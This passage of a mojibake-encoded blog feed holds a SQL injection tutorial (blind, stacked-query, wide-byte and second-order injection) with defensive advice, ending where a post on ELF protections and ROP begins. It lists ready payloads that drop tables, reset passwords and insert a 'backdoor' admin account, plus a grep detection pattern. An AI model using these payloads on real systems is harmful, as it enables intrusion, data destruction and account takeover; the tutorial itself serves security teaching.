class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>ç›²æ³¨è‡ªåŠ¨åŒ–æŠ€å·§</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># é€ä½åˆ¤æ–­æ•°æ®åº“å<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">122</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based-Blind-Injectionï¼‰\"><a href=\"#4-å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based-Blind-Injectionï¼‰\" class=\"headerlink\" title=\"4. å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based Blind Injectionï¼‰\"></a>4. å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based Blind Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡æ„é€ å¸ƒå°”è¡¨è¾¾å¼ï¼Œæ ¹æ®é¡µé¢è¿”å›å†…å®¹çš„å·®å¼‚æ¥æ¨æµ‹æ•°æ®åº“ä¿¡æ¯ã€‚å½“æ¡ä»¶ä¸ºçœŸæ—¶é¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œæ¡ä»¶ä¸ºå‡æ—¶é¡µé¢å¼‚å¸¸æˆ–å†…å®¹å‘ç”Ÿå˜åŒ–ã€‚</p>\n<p><strong>æ ¸å¿ƒå‡½æ•°ä¸æŠ€å·§</strong>ï¼š</p>\n<ul>\n<li><code>substr(str, pos, len)</code> - å­—ç¬¦ä¸²æˆªå–</li>\n<li><code>ascii(char)</code> - å­—ç¬¦è½¬ASCIIç </li>\n<li><code>length(str)</code> - å­—ç¬¦ä¸²é•¿åº¦</li>\n<li><code>like</code> - æ¨¡ç³ŠåŒ¹é…</li>\n</ul>\n<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># åˆ¤æ–­æ•°æ®åº“åé•¿åº¦<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> length(<span class=\"hljs-keyword\">database</span>())=<span class=\"hljs-number\">8</span> <span class=\"hljs-comment\">--</span><br><br># é€ä½çˆ†ç ´æ•°æ®åº“å<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> <span class=\"hljs-comment\">--  # &#x27;s&#x27;</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">101</span> <span class=\"hljs-comment\">--  # &#x27;e&#x27;</span><br><br># ä½¿ç”¨<span class=\"hljs-keyword\">like</span>è¿›è¡Œæ¨¡ç³ŠåŒ¹é…<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">&#x27;sec%&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked-Query-Injectionï¼‰\"><a href=\"#5-å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked-Query-Injectionï¼‰\" class=\"headerlink\" title=\"5. å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰\"></a>5. å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šå½“æ•°æ®åº“å’ŒWebåº”ç”¨æ”¯æŒåœ¨ä¸€æ¬¡è¯·æ±‚ä¸­æ‰§è¡Œå¤šæ¡SQLè¯­å¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨åˆ†å·<code>;</code>åˆ†éš”å¤šæ¡è¯­å¥ï¼Œå®ç°æ›´å¤æ‚çš„æ”»å‡»æ“ä½œã€‚</p>\n<p><strong>æ”¯æŒæƒ…å†µ</strong>ï¼š</p>\n<ul>\n<li><strong>MySQL</strong>: éœ€è¦ä½¿ç”¨<code>multi_query()</code>å‡½æ•°ï¼Œé»˜è®¤ä¸æ”¯æŒ</li>\n<li><strong>SQL Server</strong>: é»˜è®¤æ”¯æŒ</li>\n<li><strong>PostgreSQL</strong>: æ”¯æŒ</li>\n<li><strong>Oracle</strong>: ä¸æ”¯æŒ</li>\n</ul>\n<p><strong>å±é™©æ“ä½œç¤ºä¾‹</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> users(username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;hacker&#x27;</span>,<span class=\"hljs-string\">&#x27;123456&#x27;</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">drop</span> <span class=\"hljs-keyword\">table</span> logs <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">&#x27;hacked&#x27;</span> <span class=\"hljs-keyword\">where</span> id=<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">create</span> <span class=\"hljs-keyword\">user</span> hacker identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">&#x27;123456&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>é«˜çº§åˆ©ç”¨</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># åˆ›å»ºæ–°ç®¡ç†å‘˜è´¦æˆ·<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> admin_users(username,<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-keyword\">role</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;backdoor&#x27;</span>,md5(<span class=\"hljs-string\">&#x27;secret&#x27;</span>),<span class=\"hljs-string\">&#x27;admin&#x27;</span>) <span class=\"hljs-comment\">--</span><br><br># ä¿®æ”¹ç°æœ‰ç”¨æˆ·æƒé™<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">role</span>=<span class=\"hljs-string\">&#x27;admin&#x27;</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">&#x27;normaluser&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide-Byte-Injectionï¼‰\"><a href=\"#6-å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide-Byte-Injectionï¼‰\" class=\"headerlink\" title=\"6. å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide Byte Injectionï¼‰\"></a>6. å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide Byte Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šåˆ©ç”¨å¤šå­—èŠ‚å­—ç¬¦é›†ï¼ˆå¦‚GBKã€GB2312ï¼‰çš„ç¼–ç ç‰¹æ€§ï¼Œä½¿è½¬ä¹‰å­—ç¬¦<code>\\</code>ä¸æ³¨å…¥å­—ç¬¦ç»„åˆæˆåˆæ³•çš„å¤šå­—èŠ‚å­—ç¬¦ï¼Œä»è€Œç»•è¿‡è½¬ä¹‰é˜²æŠ¤æœºåˆ¶ã€‚</p>\n<p><strong>æŠ€æœ¯èƒŒæ™¯</strong>ï¼š</p>\n<ul>\n<li>GBKç¼–ç ä¸­ï¼Œä¸€ä¸ªæ±‰å­—å ç”¨2ä¸ªå­—èŠ‚</li>\n<li>æŸäº›å­—èŠ‚ç»„åˆä¼šè¢«è§£é‡Šä¸ºå•ä¸ªæ±‰å­—å­—ç¬¦</li>\n<li><code>%df%5c</code> åœ¨GBKç¼–ç ä¸‹ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªæ±‰å­—</li>\n</ul>\n<p><strong>ç»•è¿‡åŸç†</strong>ï¼š</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-comment\"># æ­£å¸¸æƒ…å†µï¼šå•å¼•å·è¢«è½¬ä¹‰</span><br>payload: admin<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">è½¬ä¹‰å: admin\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br><br><span class=\"hljs-comment\"># å®½å­—èŠ‚ç»•è¿‡ï¼š</span><br>payload: admin%df<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">è½¬ä¹‰å: admin%df\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br>GBKè§£æ: admin[æ±‰å­—]<span class=\"hljs-string\">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>å®æˆ˜payload</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?username=<span class=\"hljs-keyword\">admin</span>%df<span class=\"hljs-string\">&#x27; union select 1,user(),3 --</span><br><span class=\"hljs-string\">?id=1%df&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,<span class=\"hljs-keyword\">database</span>())) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order-Injectionï¼‰\"><a href=\"#7-äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order-Injectionï¼‰\" class=\"headerlink\" title=\"7. äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order Injectionï¼‰\"></a>7. äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šæ¶æ„payloadåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­è¢«æ­£å¸¸å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä½†åœ¨åç»­çš„æŸ¥è¯¢ä¸­è¢«è°ƒç”¨æ—¶è§¦å‘SQLæ³¨å…¥ã€‚è¿™ç§æ”»å‡»æ–¹å¼å…·æœ‰å¾ˆå¼ºçš„éšè”½æ€§ã€‚</p>\n<p><strong>æ”»å‡»æµç¨‹</strong>ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€é˜¶æ®µ - æ•°æ®å­˜å‚¨</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-comment\"># ç”¨æˆ·æ³¨å†Œæ—¶æäº¤æ¶æ„ç”¨æˆ·å</span><br>username: admin&#x27;<span class=\"hljs-comment\">--</span><br><span class=\"hljs-comment\"># è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>ç¬¬äºŒé˜¶æ®µ - è§¦å‘æ³¨å…¥</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"># ç®¡ç†åå°æŸ¥è¯¢è¯¥ç”¨æˆ·ä¿¡æ¯æ—¶<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> username <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;admin&#x27;</span><span class=\"hljs-comment\">--&#x27;</span><br># æ³¨é‡Šç¬¦å¯¼è‡´åç»­æ¡ä»¶è¢«å¿½ç•¥<br></code></pre></td></tr></table></figure>\n\n<p><strong>å…¸å‹åº”ç”¨åœºæ™¯</strong>ï¼š</p>\n<ul>\n<li>ç”¨æˆ·æ³¨å†Œ&#x2F;ä¸ªäººä¿¡æ¯ä¿®æ”¹</li>\n<li>æ–‡ç« è¯„è®ºç³»ç»Ÿ</li>\n<li>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æ–‡ä»¶åå¤„ç†</li>\n<li>æ—¥å¿—è®°å½•ç³»ç»Ÿ</li>\n</ul>\n<h2 id=\"é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ\"><a href=\"#é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ\"></a>é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ</h2><h3 id=\"å¼€å‘å±‚é¢é˜²æŠ¤\"><a href=\"#å¼€å‘å±‚é¢é˜²æŠ¤\" class=\"headerlink\" title=\"å¼€å‘å±‚é¢é˜²æŠ¤\"></a>å¼€å‘å±‚é¢é˜²æŠ¤</h3><ol>\n<li><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢&#x2F;é¢„ç¼–è¯‘è¯­å¥</strong></li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-regexp\">//</span> é”™è¯¯å†™æ³•<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><br><span class=\"hljs-regexp\">//</span> æ­£ç¡®å†™æ³•  <br><span class=\"hljs-variable\">$stmt</span> = <span class=\"hljs-variable\">$pdo</span>-&gt;prepare(<span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class=\"hljs-variable\">$stmt</span>-&gt;execute([<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]]);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>ä¸¥æ ¼çš„è¾“å…¥éªŒè¯</strong></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// ç™½åå•éªŒè¯</span><br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/^[0-9]+$/&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Invalid input&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// é•¿åº¦é™åˆ¶</span><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;username&#x27;</span>]) &gt; <span class=\"hljs-number\">50</span>) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Username too long&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>ä½¿ç”¨ORMæ¡†æ¶</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># Django ORM - è‡ªåŠ¨å‚æ•°åŒ–<br><span class=\"hljs-keyword\">User</span>.objects.<span class=\"hljs-keyword\">filter</span>(id=user_id)<br><br># SQLAlchemy - å®‰å…¨æŸ¥è¯¢<br><span class=\"hljs-keyword\">session</span>.query(<span class=\"hljs-keyword\">User</span>).<span class=\"hljs-keyword\">filter</span>(<span class=\"hljs-keyword\">User</span>.id == user_id)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ•°æ®åº“å±‚é¢é˜²æŠ¤\"><a href=\"#æ•°æ®åº“å±‚é¢é˜²æŠ¤\" class=\"headerlink\" title=\"æ•°æ®åº“å±‚é¢é˜²æŠ¤\"></a>æ•°æ®åº“å±‚é¢é˜²æŠ¤</h3><ol>\n<li><strong>æœ€å°æƒé™åŸåˆ™</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-comment\">-- åˆ›å»ºä¸“ç”¨åº”ç”¨è´¦æˆ·ï¼Œä»…æˆäºˆå¿…è¦æƒé™</span><br><span class=\"hljs-keyword\">CREATE</span> <span class=\"hljs-keyword\">USER</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span> IDENTIFIED <span class=\"hljs-keyword\">BY</span> <span class=\"hljs-string\">&#x27;strong_password&#x27;</span>;<br><span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">SELECT</span>, <span class=\"hljs-keyword\">INSERT</span>, <span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">ON</span> webapp_db.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span>;<br><span class=\"hljs-comment\">-- ç¦æ­¢DROP, ALTER, FILEç­‰å±é™©æƒé™</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>å…³é—­é”™è¯¯ä¿¡æ¯æ˜¾ç¤º</strong></li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">// ç”Ÿäº§ç¯å¢ƒå…³é—­é”™è¯¯æ˜¾ç¤º</span><br><span class=\"hljs-built_in\">ini_set</span>(&#x27;display_errors&#x27;, <span class=\"hljs-number\">0</span>);<br><span class=\"hljs-built_in\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>å¯ç”¨SQLæŸ¥è¯¢æ—¥å¿—</strong></li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-comment\">-- MySQLå¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—</span><br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> slow_query_log <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;ON&#x27;</span>;<br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> long_query_time <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"WAFä¸ç›‘æ§\"><a href=\"#WAFä¸ç›‘æ§\" class=\"headerlink\" title=\"WAFä¸ç›‘æ§\"></a>WAFä¸ç›‘æ§</h3><ol>\n<li><strong>éƒ¨ç½²Webåº”ç”¨é˜²ç«å¢™</strong></li>\n</ol>\n<ul>\n<li>ModSecurityè§„åˆ™é›†</li>\n<li>äº‘WAFæœåŠ¡ï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ç­‰ï¼‰</li>\n<li>è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™</li>\n</ul>\n<ol>\n<li><strong>å®æ—¶ç›‘æ§ä¸å‘Šè­¦</strong></li>\n</ol>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># ç›‘æ§å¼‚å¸¸SQLæŸ¥è¯¢</span><br>tail <span class=\"hljs-punctuation\">-</span>f /var/<span class=\"hljs-built_in\">log</span>/mysql/mysql.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-string\">| grep -i &quot;</span>union\\<span class=\"hljs-string\">|sleep\\|benchmark&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>SQLæ³¨å…¥æ¼æ´è™½ç„¶æ˜¯ä¸€ä¸ªâ€è€â€é—®é¢˜ï¼Œä½†åœ¨å®é™…çš„æ¸—é€æµ‹è¯•å’Œå®‰å…¨è¯„ä¼°ä¸­ä»ç„¶å¤§é‡å­˜åœ¨ã€‚ç†è§£å„ç§æ³¨å…¥ç±»å‹çš„åŸç†å’Œåˆ©ç”¨æ–¹æ³•ï¼Œå¯¹äºå®‰å…¨ç ”ç©¶äººå‘˜å‘ç°æ¼æ´ã€å¼€å‘äººå‘˜ä¿®å¤æ¼æ´éƒ½å…·æœ‰é‡è¦æ„ä¹‰ã€‚</p>\n<p><strong>å…³é”®è¦ç‚¹å›é¡¾</strong>ï¼š</p>\n<ul>\n<li>é”™è¯¯æ³¨å…¥åˆ©ç”¨æ•°æ®åº“æŠ¥é”™è·å–ä¿¡æ¯</li>\n<li>è”åˆæ³¨å…¥é€šè¿‡unionè¯­å¥ç›´æ¥è·å–æ•°æ®</li>\n<li>æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨é€‚ç”¨äºæ— å›æ˜¾åœºæ™¯</li>\n<li>å †å æ³¨å…¥å±é™©æ€§æœ€é«˜ï¼Œå¯æ‰§è¡Œä»»æ„SQLæ“ä½œ</li>\n<li>å®½å­—èŠ‚æ³¨å…¥é’ˆå¯¹ç‰¹å®šç¼–ç ç¯å¢ƒ</li>\n<li>äºŒæ¬¡æ³¨å…¥å…·æœ‰è¾ƒå¼ºçš„éšè”½æ€§</li>\n</ul>\n<p><strong>é˜²æŠ¤æ ¸å¿ƒ</strong>ï¼š</p>\n<ul>\n<li>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ˜¯æœ€æœ‰æ•ˆçš„é˜²æŠ¤æ‰‹æ®µ</li>\n<li>è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç åŒæ ·é‡è¦</li>\n<li>éµå¾ªæœ€å°æƒé™åŸåˆ™é…ç½®æ•°æ®åº“æƒé™</li>\n<li>å®šæœŸè¿›è¡Œå®‰å…¨è¯„ä¼°å’Œä»£ç å®¡è®¡</li>\n</ul>\n<p>å¸Œæœ›æœ¬æ–‡èƒ½å¤Ÿå¸®åŠ©è¯»è€…å…¨é¢ç†è§£SQLæ³¨å…¥çš„æ”»é˜²æŠ€æœ¯ï¼Œåœ¨å®é™…å·¥ä½œä¸­æ›´å¥½åœ°ä¿æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚</p>\n<hr>\n<blockquote>\n<p><strong>å…è´£å£°æ˜</strong>ï¼šæœ¬æ–‡å†…å®¹ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•äººä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œè¿æ³•æ´»åŠ¨ï¼Œåæœè‡ªè´Ÿã€‚</p>\n</blockquote>\n",
            "tags": [
                "æ¸—é€æµ‹è¯•",
                "Webå®‰å…¨",
                "SQLæ³¨å…¥",
                "ç½‘ç»œå®‰å…¨"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/22/ELF-%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E-ROP-%E6%9E%84%E9%80%A0%E8%AF%A6%E8%A7%A3/",
            "url": "https://bae-ace.github.io/2025/07/22/ELF-%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E-ROP-%E6%9E%84%E9%80%A0%E8%AF%A6%E8%A7%A3/",
            "title": "ELF æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ä¸ ROP æ„é€ è¯¦è§£",
            "date_published": "2025-07-22T12:41:04.000Z",
            "content_html": "<h1 id=\"ELF-æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ä¸-ROP-æ„é€ è¯¦è§£\"><a href=\"#ELF-æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ä¸-ROP-æ„é€ è¯¦è§£\" class=\"headerlink\" title=\"ELF æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ä¸ ROP æ„é€ è¯¦è§£\"></a>ELF æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ä¸ ROP æ„é€ è¯¦è§£</h1><p>åœ¨ CTFï¼ˆCapture The Flagï¼‰ç«èµ›å’ŒäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ä¸­ï¼Œç†è§£ ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶çš„æ¶æ„ä¿¡æ¯åŠå…¶ä¿æŠ¤æœºåˆ¶è‡³å…³é‡è¦ã€‚æœ¬æ–‡å°†è¯¦ç»†åˆ†æ ELF æ–‡ä»¶çš„æ¶æ„ç‰¹æ€§ã€å¸¸è§ä¿æŠ¤æœºåˆ¶ã€å‡½æ•°è°ƒç”¨çº¦å®šï¼Œä»¥åŠå¦‚ä½•é€šè¿‡ ROPï¼ˆReturn-Oriented Programmingï¼‰æŠ€æœ¯è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚</p>\n<h2 id=\"ELF-æ¶æ„ä¿¡æ¯\"><a href=\"#ELF-æ¶æ„ä¿¡æ¯\" class=\"headerlink\" title=\"ELF æ¶æ„ä¿¡æ¯\"></a>ELF æ¶æ„ä¿¡æ¯</h2><p>ELF æ–‡ä»¶æ˜¯ Linux ç³»ç»Ÿä¸‹å¸¸è§çš„å¯æ‰§è¡Œæ–‡ä»¶æ 